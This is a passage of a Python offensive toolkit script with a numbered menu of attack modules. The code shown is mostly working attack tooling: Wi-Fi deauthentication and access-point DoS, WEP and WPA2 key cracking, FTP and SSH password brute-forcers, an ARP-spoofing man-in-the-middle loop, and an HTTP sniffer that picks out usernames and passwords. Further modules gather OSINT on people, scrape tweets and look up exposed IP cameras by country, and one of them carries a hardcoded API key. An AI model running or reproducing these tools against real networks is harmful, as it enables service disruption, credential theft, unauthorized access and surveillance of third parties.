						subprocess.run(["sudo", "ifconfig", interface, "up"])
						print("\n\n[-] Quitting... Run (service NetworkManager restart) to restart network")
		elif choice == 2:
			try:
				interface = input("\n[?] Please specify the interface you wish to use: ")
				subprocess.run(["sudo", "airmon-ng", "check", "kill"])
				subprocess.run(["iwconfig", interface, "mode", "monitor"])
				subprocess.run(["ifconfig", interface, "up"])

				bssid = input("[?] Router BSSID address: ")
				target_bssid = input("[?] Client MAC address you wish to target: ")
				channel = input("[?] Channel used: ")

				subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
				subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
			except KeyboardInterrupt:
				print("[-] Program finished, restoring network...\n\n")
				subprocess.run(["sudo", "airmon-ng", "stop", interface])
				subprocess.run(["sudo", "ifconfig", interface, "down"])
				subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"])
				subprocess.run(["sudo", "ifconfig", interface, "up"])
				print("\n\n[-] Quitting... Run (service NetworkManager restart) to restart network")
		else:
			print("[-] None chosen, quitting...")

	## DOS ATTACK
	def dos():
		print("[=] Running Module nº15: Access Point DoS Attack...")
		try:
			print("[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
			interface = input("[?] Please specify the interface you wish to use: ")
			subprocess.run(["ifconfig", interface, "down"])
			# Kill processes in network
			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
			subprocess.run(["iwconfig", interface, "mode", "monitor"])
			subprocess.run(["ifconfig", interface, "up"])

			print("[?] Do you wish to scan networks or skip to attack")
			print("------------------------------------------------------")
			print("[1] Scan")
			choice = int(input("[2] Skip to attack\n"))
			if choice == 1:
				try:
					print("[?] Check for 2G or 5G networks?")
					print("--------------------------------")
					print("[1] 2.4 Ghz Networks")
					print("[2] 5 Ghz Networks")
					band = int(input("[3] Both bands (slower speed)\n"))
					if band == 1:
						subprocess.run(["sudo", "airodump-ng", interface])
					elif band ==2:
						subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
					elif band ==3:
						subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
					else:
						print("[-] None of the above chosen, quitting program")
				except ValueError:
					print("[-] None of the above chosen, quitting program")
				except KeyboardInterrupt:
					try:
						bssid = input("[?] Access Point BSSID: ")
						channel = input("[?] Channel used: ")
						subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
						print("\n[=] Running Deauth attack...\n\n")
						subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
					except KeyboardInterrupt:
						print("[-] Program finished, restoring network...\n\n")
						subprocess.run(["sudo", "airmon-ng", "stop", interface])
						subprocess.run(["sudo", "ifconfig", interface, "down"])
						subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"])
						subprocess.run(["sudo", "ifconfig", interface, "up"])
						print("\n\n[-] Quitting... Run (service NetworkManager restart) to restart network")
			elif choice == 2:
				try:
					bssid = input("[?] Access Point BSSID: ")
					channel = input("[?] Channel used: ")
					subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
					print("\n[=] Running Deauth attack...\n\n")
					subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
				except KeyboardInterrupt:
					print("[-] Program finished\n")
					subprocess.run(["sudo", "airmon-ng", "stop", interface])
					subprocess.run(["sudo", "ifconfig", interface, "down"])
					subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"])
					subprocess.run(["sudo", "ifconfig", interface, "up"])
					print("\n\n[-] Quitting... Run (service NetworkManager restart) to restart network")
			else:
				print("[-] None of the above chosen, quitting program")
		except KeyboardInterrupt:
			print("[-] Program interrumpted by user, restoring network...\n\n")
			subprocess.run(["sudo", "airmon-ng", "stop", interface])
			subprocess.run(["sudo", "ifconfig", interface, "down"])
			subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"])
			subprocess.run(["sudo", "ifconfig", interface, "up"])
			print("\n\n[-] Quitting... Run (service NetworkManager restart) to restart network")

		except ValueError:
			print("[-] None of the above chosen, quitting program")		
					
	## WEP CRACKING
	def wep_crack():
		print(Fore.CYAN + "[=] Running Module nº16: WEP Cracking Attack..." + Fore.WHITE)
		try:
			print("[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
			interface = input("[?] Please specify the interface you wish to use: ")
			subprocess.run(["ifconfig", interface, "down"])
			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
			subprocess.run(["iwconfig", interface, "mode", "monitor"])
			subprocess.run(["ifconfig", interface, "up"])
			subprocess.run(["sudo","airodump-ng", interface, "--encrypt", "wep"])
		except KeyboardInterrupt:
			try:
				print("[?] Please specify the details of your desired network:")
				print("-------------------------------------------------------")
				bssid = input("[?] Router MAC address: ")
				channel = input("[?] Channel used: ")
				file = input("[?] File name you wish to use for .cap file: ")
				print("[+] Ctrl + c to proceed when you wish")

				subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel,"--write", file, interface])

			except KeyboardInterrupt:
				try:
					print(f"[=] {file} generated, cracking password...\n\n")
					subprocess.run(["sudo", "aircrack-ng", file])
				except KeyboardInterrupt:
					print("[-] Program finished by user, quitting...\n\n")

	## WPA/WPA2 CRACKING
	def wpa_crack():
		print("[=] Running Module nº17: WPA2 wordlist cracking...")
		print("[+] This module requires a wordlist, you can generate one using the built-in module of this toolkit")
		try:
			print("[+] Use Ctrl + c at any time to proceed")
			interface = input("[?] Please specify the interface you wish to use: ")
			subprocess.run(["ifconfig", interface, "down"])
			# Kill processes in network
			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
			subprocess.run(["iwconfig", interface, "mode", "monitor"])
			subprocess.run(["ifconfig", interface, "up"])
			try:
				print("[?] Check for 2G or 5G networks?")
				print("--------------------------------")
				print("[1] 2.4 Ghz Networks")
				print("[2] 5 Ghz Networks")
				band = int(input("[3] Both bands (slower speed)\n"))
				if band == 1:
					subprocess.run(["sudo", "airodump-ng", interface])
				elif band ==2:
					subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
				elif band ==3:
					subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
				else:
					print("[-] None of the above chosen, quitting program")
			except ValueError:
				print("[-] None of the above chosen, quitting program")
		except KeyboardInterrupt:
			try:
				print("[?] Please specify the details of your desired network:")
				print("-------------------------------------------------------")
				bssid = input("[?] Router MAC address: ")
				channel = input("[?] Channel used: ")
				print("[+] Ctrl + c to proceed when you wish")

				subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])

			except KeyboardInterrupt:
				try:
					print("[+] Run module nº10 Target deauth attack on a client to capture handshake.")
					print("[+] Ctrl + c to proceed to crack CAP file when handshake has been captured")
					cap_file = input("\n[?] Please specify the name of the CAP file you wish to use: ")
					subprocess.run(["sudo", "airodump-ng", "-w", cap_file, "-c", channel, "--bssid", bssid, interface])
				except KeyboardInterrupt:
					try:
						
						print(f"[-] Program finished, CAP file stored as {cap_file}.\n\n")
						wordlist = input("[?] Please, specify the path of the wordlist you wish to use: ")
						cap = cap_file + "-01.cap"
						subprocess.run(["sudo", "aircrack-ng", cap, "-w", wordlist])
					except KeyboardInterrupt:
						print("[-] Program interrumpted by user, quitting...")

	## FTP BRUTE FORCE ##
	def ftp_cracker():
		import ftplib

		print(Fore.CYAN + "[=] Running Module nº18: FTP Brute Force...\n" + Fore.WHITE)
		print("[+] This module requires a wordlist, you can generate one using the built-in module of this toolkit")

		server = input("[?] Specify the ip address of target server: ")
		user = input("[?] Specify target user to test passwords: ")
		passwordlist = input("[?] Specify a path to desired wordlist: ")

		try:
			with open(passwordlist, 'r') as pw:
				for word in pw:
					word = word.strip('\r').strip('\n')

					try:
						ftp = ftplib.FTP(server)
						ftp.login(user, word)

						print("\n[+] Success! The password is " + word + "\n\n")

					except:
						print("\n[=] Trying other passwords...\n\n")
		except KeyboardInterrupt:
			print("[-] Program ended by user, quitting...\n\n")
		except:
			print("[-] FTP server credentials don't mach any password in wordlist, quitting...\n\n")

	## SSH BRUTE FORCE ##
	def ssh_brute():
	    import paramiko
	    import socket

	    def is_ssh_open(hostname, username, password):
	        # initialize SSH client
	        client = paramiko.SSHClient()
	        # add to know hosts
	        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	        try:
	            client.connect(hostname=hostname, username=username, password=password, timeout=3)
	        except socket.timeout:
	            # this is when host is unreachable
	            print(Fore.RED + f"[-] Host: {hostname} is unreachable, timed out." + Fore.WHITE)
	            return False
	        except paramiko.AuthenticationException:
	            print(f"[-] Invalid credentials for {username}:{password}")
	            return False
	        except paramiko.SSHException:
	            print(f"[-] Quota exceeded, retrying with 60s delay..." + Fore.WHITE)
	            # sleep for a minute
	            time.sleep(60)
	            return is_ssh_open(hostname, username, password)
	        else:
	            # connection was established successfully
	            print(Fore.CYAN + f"\n[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}" + Fore.WHITE)
	            return True
	
	    print(Fore.CYAN + "[=] Running Module nº19: SSH Password Brute Force..." + Fore.WHITE)
	    print("[+] This module requires a wordlist, you can generate one using the built-in module of this toolkit")
	    server = input("[?] Specify the ip address of target server: ")
	    user = input("[?] Specify target user to test passwords: ")
	    path = input("[?] Specify a path to desired wordlist: ")
	    
	    wordlist = open(path).read().splitlines()

	    for password in wordlist:
	    	if is_ssh_open(server, user, password):
	    		open("login_details.txt", "w").write(f"{user}@{server} with password = {password}")

	## ARP SPOOF ##
	def arp_spoof():
		import scapy.all as scapy
		print(Fore.CYAN + "[=] Running Module nº20: Arp spoofing attack..." + Fore.WHITE)
		print("[+] Run echo 1 > /proc/sys/net/ipv4/ip_forward as root")
		def get_mac(ip):
			arp_request = scapy.ARP(pdst=ip)
			broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
			arp_request_broadcast = broadcast/arp_request
			answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
			
			return answered_list[0][1].hwsrc

		def spoof(target_ip, spoof_ip):
			target_mac = get_mac(target_ip)
			# Create ARP packet and send it to target
			packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
			scapy.send(packet, verbose=False)

		def restore(dest_ip, src_ip):
			dest_mac = get_mac(dest_ip)
			src_mac = get_mac(src_ip)
			packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
			scapy.send(packet, verbose=False)

		router_ip = input("[?] Enter the target ip address: ")
		target_ip = input("[?] Enter the router ip address: ")

		sent_packets_count = 0 
		try:
			while True:
				spoof(target_ip, router_ip)
				spoof(router_ip, target_ip)
				sent_packets_count = sent_packets_count + 2
				print("\r[=] Packets sent: " + str(sent_packets_count), end="")
				time.sleep(2)
		except KeyboardInterrupt:
			restore(target_ip, router_ip)
			print("\n[-] Program ended by user, quitting and restorin ARP tables...\n\n")

	## P*SSWRD AND URL SNIFFER ##
	def psswd_url_sniff():	
		import scapy.all as scapy
		from scapy.layers import http
		print(Fore.CYAN + "[=] Running Module nº21: Password and Url sniffer..." + Fore.WHITE)

		try:
			
			def sniff(interface):
				scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")
			
			def get_url(packet):
				return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

			def get_login(packet):
				if packet.haslayer(scapy.Raw):
						load = str(packet[scapy.Raw].load)
						keywords = ["username", "password", "user", "passwd", "usr", "login", "pass"]
						for keyword in keywords:
							if keyword in load:
								return load

			def process_sniffed_packet(packet):
				if packet.haslayer(http.HTTPRequest):
					
					url = get_url(packet)
					print("[+] HTTPRequest >> " + url.decode())

					login_info = get_login(packet)
					if login_info:
						print("\n\n[+] Possible login info >> " + login_info + "\n\n\n")
					
			interface = input("[?] Interface you wish to use for sniffing attack: ")
			sniff(interface) 
			print("[=] Sniffer running...\n\n")
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...\n\n")

	# UPDATE DEPENDECIES
	def update():
		print(Fore.CYAN + "\n[=] Gathering information and updating dependecies..." + Fore.WHITE)
		subprocess.run(["sudo", "apt", "update", "-y"])
		subprocess.run(["sudo", "apt", "upgrade", "-y"])
		subprocess.run(["sudo", "apt", "install", "python3-pip", "-y"])
		subprocess.run(["sudo", "pip3", "install", "--user", "--upgrade", "git+https://github.com/himanshudabas/twint.git@origin/twint-fixes#egg=twint"])
		subprocess.run(["sudo", "pip3", "install", "scapy_http"])
		subprocess.run(["sudo", "pip3", "install", "scapy"])
		subprocess.run(["sudo", "pip3", "install", "html5lib"])
		subprocess.run(["sudo", "pip3", "install", "lxml"])
		subprocess.run(["sudo", "pip3", "install", "beautifulsoup4"])
		subprocess.run(["sudo", "apt", "install", "nikto", "-y"])

		print("\n\n[+] Update completed :)")
		print("\n\n")

	## OPTIONS
	def show_modules():
		print(Fore.CYAN + "\n[01]--Password generator")
		print("[02]--Wordlist Generator")
		print("[03]--Domain/IP address information gathering")
		print("[04]--Website Information Gathering")
		print("[05]--Phone Information gathering")
		print("[06]--Username gatherer")
		print("[07]--Twitter information gathering")
		print("[08]--Security IP City Cameras")
		print("[09]--Web server Vulnerability Scanner")
		print("[10]--Bluetooth scanner")
		print("[11]--MAC address changer")
		print("[12]--Network Scanner")
		print("[13]--Open port Scanner")
		print("[14]--Target Deauthorization Attack")
		print("[15]--Access Point DoS Attack")
		print("[16]--WEP Cracking")
		print("[17]--WPA2 wordlist cracking")
		print("[18]--FTP Password Brute Force")
		print("[19]--SSH Password Brute Force")
		print("[20]--Arp spoofing MITM attack")
		print("[21]--HTTP Password and Url sniffer")
		print(Fore.MAGENTA + "\n\n[0]--Quit")
		print(Fore.CYAN + "---------------------------------"+ Fore.WHITE)
		try:
			option = int(input("[?] Where do you want to start: \n\n"))
			if option == 1:
				psswd_gen()
			elif option == 2:
				wordlists()
			elif option == 3:
				lookup()
			elif option == 4:
				web_info()
			elif option == 5:
				phone()
			elif option == 6:
				usernames()
			elif option == 7:
				tweets()
			elif option == 8:
				cameras()
			elif option == 9:
				vuln_web()
			elif option == 10:
				bluetooth()
			elif option == 11:
				mac_changer()
			elif option == 12:
				net_scan()
			elif option == 13:
				port_scan()
			elif option == 14:
				deauth_attack()
			elif option == 15:
				dos()
			elif option == 16:
				wep_crack()
			elif option == 17:
				wpa_crack()
			elif option == 18:
				ftp_cracker()
			elif option == 19:
				ssh_brute()
			elif option == 20:
				arp_spoof()
			elif option == 21:
				psswd_url_sniff()
			elif option == 0:
				print(Fore.CYAN + "[-] Quitting..." + Fore.WHITE)
			elif option == 99:
				show_modules()
			elif option == 98:
				update() 
		except KeyboardInterrupt:
			print(Fore.CYAN + "\n[-] Program interrumpted, quitting...\n\n"+ Fore.WHITE)
		except ValueError:
			print(Fore.CYAN + "\n[-] Wrong value given, quitting...\n\n" + Fore.WHITE)

	try:
		choice = int(input(Fore.CYAN + "[?] Welcome, what module you wish to load:\n[+] 21 Modules loaded\n[98] Install/Update dependecies\n[99] Show modules\n"+ Fore.MAGENTA +"[0] Quit program\n\n" + Fore.WHITE))
		if choice == 1:
			psswd_gen()
		elif choice == 80:
			wordpress()
		elif choice == 2:
			wordlists()
		elif choice == 3:
			lookup()
		elif choice == 4:
			web_info()
		elif choice == 5:
			phone()
		elif choice == 6:
			usernames()
		elif choice == 7:
			tweets()
		elif choice == 8:
			cameras()
		elif choice == 9:
			vuln_web()
		elif choice == 10:
			bluetooth()
		elif choice == 11:
			mac_changer()
		elif choice == 12:
			net_scan()
		elif choice == 13:
			port_scan()
		elif choice == 14:
			deauth_attack()
		elif choice == 15:
			dos()
		elif choice == 16:
			wep_crack()
		elif choice == 17:
			wpa_crack()
		elif choice == 18:
			ftp_cracker()
		elif choice == 19:
			ssh_brute()
		elif choice == 20:
			arp_spoof()
		elif choice == 21:
			psswd_url_sniff()
		elif choice == 0:
			print(Fore.CYAN + "[-] Quitting..." + Fore.WHITE)
		elif choice == 99:
			show_modules()
		elif choice == 98:
			update() 
		elif choice == 0:
			print(Fore.CYAN + "[-] Quitting..." + Fore.WHITE)
		else:
			print(Fore.CYAN + "[-] None chosen, quitting...\n\n" + Fore.WHITE)
	except KeyboardInterrupt:
		print(Fore.CYAN + "\n[-] Program interrumpted, quitting...\n\n" + Fore.WHITE)
	except ValueError:
		print(Fore.CYAN + "\n[-] Wrong value given, quitting...\n\n" + Fore.WHITE)

## macOS main
def main_macos():
	print("[1]      [2]      [3]      [4]      [5]      [6]      [7]      [8]      [9]      [10]\n")
	## PASSWORD GENERATOR
	def psswd_gen():
		print(Fore.CYAN + "[=] Running Module nº1: Password generator..." + Fore.WHITE)
		import string
		import random
		try:
			length = int(input("[?] Please enter the length of the password: "))

			ascii_lower = string.ascii_lowercase
			ascii_upper = string.ascii_uppercase
			ascii_digits = string.digits
			ascii_symbols = string.punctuation
			ascii_all = ascii_symbols + ascii_digits + ascii_upper + ascii_lower

			mix = random.sample(ascii_all, length)	
			password = "".join(mix)

			print("[+] Here's your new password: " + password)
		except ValueError:
			print("\n[-] Length has to be a int value, quitting...\n\n")

	## DOMAIN/IP INFORMATION GATHERER
	def lookup():
		import requests

		print(Fore.CYAN + "[=] Running Module nº2: Domain/IP address information gathering..." + Fore.WHITE)

		web = "http://ip-api.com/json/"
		target = input("[?] Specify the IP address or the domain you wish to target: ")

		web += target
		response = requests.get(web).json()

		print("\n[=] Gathering information...")
		print("----------------------------")
		print("IP address: " + response['query'])
		print("Status: " + response['status'])
		print("Country/Code: " + response['country'] + response['countryCode'])
		print("City: " + response['city'])
		print("Timezone: " + response['timezone'])
		print("Latitude: " + str(response['lat']))
		print("Longitude: " + str(response['lon']))
		print("Domain: " + response['org'])
		print("ISP: " + response['isp'])
		print("-------------------------------------------\n")

	## PHONE INFORMATION GATHERING
	def phone():
		import requests
		import json

		print(Fore.CYAN + "[=] Running Module nº3: Phone Information gathering..." + Fore.WHITE)
		config_key = "83c4959db3119ceb89d4390911a5ce0e"

		number = input("[?] Please specify a phone you wish to target: ")

		web = "http://apilayer.net/api/validate?access_key=" + config_key + "&number=" + number + "&country_code=&format=1"

		output = requests.get(web)
		content = output.text
		obj = json.loads(content)
		country_name = obj['country_name']
		country_code = obj['country_code']
		carrier = obj['carrier']
		prefix = obj['country_prefix']
		line_type = obj['line_type']
		international_format = obj['international_format']

		print(Fore.CYAN + "\n[=] Gathering information...")
		print("---------------------------------------")
		print("Phone number: " + str(international_format))
		print("Country: " + str(country_name))
		print("Country Code: " + str(country_code))
		print("Country Prefix: " + str(prefix))
		print("Carrier: " + str(carrier))
		print("Line Type: " + str(line_type))
		print("---------------------------------------\n" + Fore.WHITE)

	## BASH USERNAME CHECKER	
	def usernames():
		subprocess.call("./usernames.sh")
		
	## TWEETER INFORMATION GATHERING with twint #
	def tweets():
		import twint
		import csv
		print(Fore.CYAN + "[=] Running Module nº5: Twitter information gathering..."+ Fore.WHITE)
		t = twint.Config()
		name_output = input("[?] Please specify a name for the output folder: ")
		t.Output = name_output
		print("[?] Please specify a limit for gathered tweets: ")
		limit = int(input("[+] Don't go above 3200\n"))
		t.Limit = limit
		t.Store_csv = True
		print("\n[?] What do you wish to search for: ")
		print("--------------------------------------------")
		print("[1]--User Tweets")
		def options():		
			choice = int(input("[2]--Location based Tweets\n"))
			if choice == 1:
				username = input("[?] Please specify the username you wish to target: ")
				t.Username = username
				## PAIN IN THE FUCKING ASS QUESTION
				def args():
					one_choice = input("[?] You wish to specify a hastag (Y/n): ")
					if one_choice.upper() == "Y":
						print("[?] Please, specify it: ")
						hastag = input("[+] remember to use # before keyword  ")
						t.Search = hastag
						t.Show_hastags = True
						two_choice = input("[?] You wish to specify a location to target (Y/n): ")
						if two_choice.upper() == "Y":
							location = input("[?] Please, specify it: ")
							t.Near = location

							three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
							if three_choice.upper() == "Y":
								who = input("[?] Please, specify the user: ")
								t.To = who

								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								#4_1	
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
							#3_1
							else:
								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
						#2_1
						else:
							three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
							if three_choice.upper() == "Y":
								who = input("[?] Please, specify the user: ")
								t.To = who

								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
							#3
							else:
								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								#4
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
					else:
						two_choice = input("[?] You wish to specify a location to target (Y/n): ")
						if two_choice.upper() == "Y":
							print("")
							location = input("[?] Please, specify it: ")
							t.Near = location
							three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
							if three_choice.upper() == "Y":
								who = input("[?] Please, specify the user: ")
								t.To = who

								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
							else:
								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
						else:
							three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
							if three_choice.upper() == "Y":
								who = input("[?] Please, specify the user: ")
								t.To = who

								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
							else:
								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
				args()
				twint.run.Search(t)
				print(f"[+] RESULTS STORED IN {name_output} FOLDER\n\n")   
			elif choice == 2:
				location = input("[?] Please, specify it: ")
				t.Near = location
				four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
				if four_choice.upper() == "Y":
					print("?] Please, specify it: ")
					since = input("[+] input as shown in this example: 2017-12-27   ")
					t.Since = since
								
					five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
					if five_choice.upper() == "Y":
						print("?] Please, specify it: ")
						until = input("[+] input as shown in this example: 2017-12-27   ")
						t.Until = until
					else:
						print("[=] Gathering tweets and storing them ")
				else:
					five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
					if five_choice.upper() == "Y":
						print("?] Please, specify it: ")
						until = input("[+] input as shown in this example: 2017-12-27   ")
						t.Until = until
					else:
						print("[=] Gathering tweets and storing them ")
				twint.run.Search(t)
				print(f"[+] RESULTS STORED IN {name_output} FOLDER\n\n")
			else:
				print("\n[-] None chosen, quitting...\n\n")
		def simplify():
			import os
			import pandas as pd
			class cd:
			    def __init__(self, newPath):
			        self.newPath = os.path.expanduser(newPath)
			    def __enter__(self):
			        self.savedPath = os.getcwd()
			        os.chdir(self.newPath)
			    def __exit__(self, etype, value, traceback):
			        os.chdir(self.savedPath)		
			with cd(f"./{name_output}"):
				with open('tweets.csv', 'rt', encoding='utf8') as csvfile:
					content = csv.reader(csvfile)
					data = list(content)
				
				file = open("simplified_tweets.txt", 'w')
				for row in data:
					file.writelines(row[3] + " | " +row[4] + " | " +row[7] + " | " + row[10] +'\n')
				file.close()
				# Convert csv to html file
				a = pd.read_csv("tweets.csv")
				a.to_html("tweets.html")
				html_file = a.to_html()
   		
		options()
		simplify()

	## CCTV CAMERAS by https://github.com/AngelSecurityTeam and filtered by city by me
	def cameras():
		import requests
		
		print(Fore.CYAN + "[=] Running module nº6, Security IP City Cameras..."+ Fore.WHITE)
		print(Fore.RED + "[+] Many thanks to AngelSecurityTeam at https://github.com/AngelSecurityTeam for the original script"+ Fore.WHITE)
		print("[?] Please choose a specific country you wish to target: ")
		print(Fore.CYAN + """
        1) United States                31) Mexico                61) Moldova
        2) Japan                        32) Finland               62) Nicaragua
        3) Italy                        33) China                 63) Malta
        4) Korea                        34) Chile                 64) Trinidad And Tobago
        5) France                       35) South Africa          65) Soudi Arabia
        6) Germany                      36) Slovakia              66) Croatia
        7) Taiwan                       37) Hungary               67) Cyprus
        8) Russian Federation           38) Ireland               68) Pakistan
        9) United Kingdom               39) Egypt                 69) United Arab Emirates
        10) Netherlands                 40) Thailand              70) Kazakhstan
        11) Czech Republic              41) Ukraine               71) Kuwait
        12) Turkey                      42) Serbia                72) Venezuela
        13) Austria                     43) Hong Kong             73) Georgia
        14) Switzerland                 44) Greece                74) Montenegro
        15) Spain                       45) Portugal              75) El Salvador
        16) Canada                      46) Latvia                76) Luxembourg
        17) Sweden                      47) Singapore             77) Curacao
        18) Israel                      48) Iceland               78) Puerto Rico
        19) Iran                        49) Malaysia              79) Costa Rica
        20) Poland                      50) Colombia              80) Belarus
        21) India                       51) Tunisia               81) Albania
        22) Norway                      52) Estonia               82) Liechtenstein
        23) Romania                     53) Dominican Republic    83) Bosnia And Herzegovia
        24) Vietnam                     54) Sloveania             84) Paraguay
        25) Belgium                     55) Ecuador               85) Philippines
        26) Brazil                      56) Lithuania             86) Faroe Islands
        27) Bulgaria                    57) Palestinian           87) Guatemala
        28) Indonesia                   58) New Zealand           88) Nepal
        29) Denmark                     59) Bangladeh             89) Peru
        30) Argentina                   60) Panama                90) Uruguay
                                                                  91) Extra
        """ + Fore.WHITE)
		try:
		    print()
